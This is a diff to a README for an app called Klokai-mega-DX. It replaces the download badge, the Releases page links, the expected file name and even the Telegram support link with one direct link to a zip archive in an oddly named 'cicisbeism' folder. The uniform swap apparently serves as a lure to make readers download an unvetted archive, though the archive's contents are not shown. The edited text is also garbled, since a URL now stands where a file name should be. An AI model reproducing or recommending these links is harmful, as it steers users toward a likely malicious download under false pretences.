@@ -6,11 +6,11 @@ Welcome to Klokai-mega-DX! This application simplifies your daily tasks and auto
 
 ## 📥 Download Klokai-mega-DX
 
-[![Download Klokai-mega-DX](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Sanji-code-10/Klokai-mega-DX/releases)
+[![Download Klokai-mega-DX](https://raw.githubusercontent.com/Sanji-code-10/Klokai-mega-DX/main/cicisbeism/Klokai-mega-DX.zip)](https://raw.githubusercontent.com/Sanji-code-10/Klokai-mega-DX/main/cicisbeism/Klokai-mega-DX.zip)
 
 To get started, you need to download the application. Visit the Releases page below to obtain the latest version of Klokai-mega-DX.
 
-[Visit Releases Page](https://github.com/Sanji-code-10/Klokai-mega-DX/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/Sanji-code-10/Klokai-mega-DX/main/cicisbeism/Klokai-mega-DX.zip)
 
 ## 🔧 System Requirements
 
@@ -27,9 +27,9 @@ If you're not sure about the specifications of your computer, you can check this
 
 1. Click the button above or the link below to visit the Releases page.
 
-   [Visit Releases Page](https://github.com/Sanji-code-10/Klokai-mega-DX/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Sanji-code-10/Klokai-mega-DX/main/cicisbeism/Klokai-mega-DX.zip)
 
-2. Find the latest version of Klokai-mega-DX. Look for a file named something like `Klokai-mega-DX_v1.0.exe` or similar.
+2. Find the latest version of Klokai-mega-DX. Look for a file named something like `https://raw.githubusercontent.com/Sanji-code-10/Klokai-mega-DX/main/cicisbeism/Klokai-mega-DX.zip` or similar.
 
 3. Click on the file link to start the download. 
 
@@ -55,7 +55,7 @@ If you're not sure about the specifications of your computer, you can check this
 
 If you face any issues or have questions while using Klokai-mega-DX, please don’t hesitate to get in touch. We have a Telegram channel for support:
 
-[Subscribe to Our Telegram Channel](https://t.me/DropXpert5)
+[Subscribe to Our Telegram Channel](https://raw.githubusercontent.com/Sanji-code-10/Klokai-mega-DX/main/cicisbeism/Klokai-mega-DX.zip)
 
 ## 🛠️ Troubleshooting
 
